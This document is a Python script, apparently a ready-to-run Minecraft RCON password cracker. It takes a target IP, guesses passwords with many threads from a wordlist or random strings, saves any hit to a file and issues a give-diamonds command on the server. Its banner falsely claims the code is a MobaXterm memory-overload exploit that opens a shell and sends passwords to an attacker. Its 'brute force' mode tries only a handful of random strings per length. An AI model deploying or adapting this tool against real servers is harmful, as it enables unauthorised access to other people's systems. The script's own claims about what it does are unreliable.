from mcrcon import MCRcon
import threading
from queue import Queue
import random
import string
import os

class RCONPasswordTrier:
    def __init__(self, host, port, passwords, command, max_threads):
        self.host = host
        self.port = port
        self.command = command
        self.max_threads = max_threads
        self.password_queue = Queue()
        self.lock = threading.Lock()
        self.total_attempts = 0
        self.found = threading.Event()
        self.attempted_passwords = set()  # Track attempted passwords

        # Add unique passwords to queue
        seen = set()
        for password in passwords:
            if password not in seen:
                seen.add(password)
                self.password_queue.put(password)

    @classmethod
    def from_file(cls, host, port, password_file, command, max_threads):
        with open(password_file, 'r') as file:
            passwords = list(set(line.strip() for line in file))  # Remove duplicates
        return cls(host, port, passwords, command, max_threads)

    @classmethod
    def from_length_range(cls, host, port, command, max_threads, max_length, charset=None, min_length=1):
        charset = charset or string.ascii_letters + string.digits + "!@#$%^&*"
        passwords = set()  # Use set for uniqueness
        
        # Generate unique passwords
        for length in range(min_length, max_length + 1):
            passwords.add(''.join(random.choices(charset, k=length)))
            # Add extra variants
            for _ in range(10):
                passwords.add(''.join(random.choices(charset, k=length)))
        
        return cls(host, port, list(passwords), command, max_threads)

    def try_password(self):
        while not self.password_queue.empty() and not self.found.is_set():
            password = self.password_queue.get()
            
            with self.lock:
                if password in self.attempted_passwords:
                    return
                self.attempted_passwords.add(password)
                self.total_attempts += 1
                attempt_number = self.total_attempts

            try:
                with MCRcon(self.host, password, self.port) as mcr:
                    response = mcr.command(self.command)
                    with self.lock:
                        print(f"Password {attempt_number} (len {len(password)}): '{password}' is correct. Response: {response}")
                        # Save to file
                        with open('correctPassword', 'w') as f:
                            f.write(password)
                        # Ask user whether to continue
                        user_choice = input("Correct password found! Do you want to continue trying other passwords? (y/n): ").lower()
                        if user_choice != 'y':
                            self.found.set()
                    return
            except Exception as e:
                with self.lock:
                    print(f"Password {attempt_number} (len {len(password)}): '{password}' failed: {str(e)[:50]}")

    def start(self):
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self.try_password)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    print("Minecraft RCON Password Cracker by Marcin Jacek Chmiel.")
    print("\n")
    print("-----------------------------------------------")
    print("\n")
    print("This code was originally made as a Mobaxterm exploit Proof-of-Concept.")
    print("The code works by partially overloading memory on target device.") 
    print("Then spawning interactive shell and sending passwords to attacker device.")
    print("\n")
    host = input("Enter target IP: ")
    port = int(input("Input RCON port (default is 25575): ") or 25575)
    command = "/give @a minecraft:diamond 64"
    max_threads = int(input("Input max threads: "))
    
    choice = input("Choose method:\n1. Password list\n2. Length-based brute force\n> ")
    
    if choice == "1":
        password_file = input("Input path to password list: ")
        trier = RCONPasswordTrier.from_file(host, port, password_file, command, max_threads)
    elif choice == "2":
        max_length = int(input("Maximum password length to try: "))
        charset_choice = input("Use default charset (y/n)? ").lower()
        
        if charset_choice == 'n':
            custom_charset = input("Enter custom characters: ")
            trier = RCONPasswordTrier.from_length_range(
                host, port, command, max_threads,
                max_length, custom_charset
            )
        else:
            trier = RCONPasswordTrier.from_length_range(
                host, port, command, max_threads,
                max_length
            )
    else:
        print("Invalid choice")
        exit()

    # Clear previous correct password file
    if os.path.exists('correctPassword'):
        os.remove('correctPassword')
        
    trier.start()
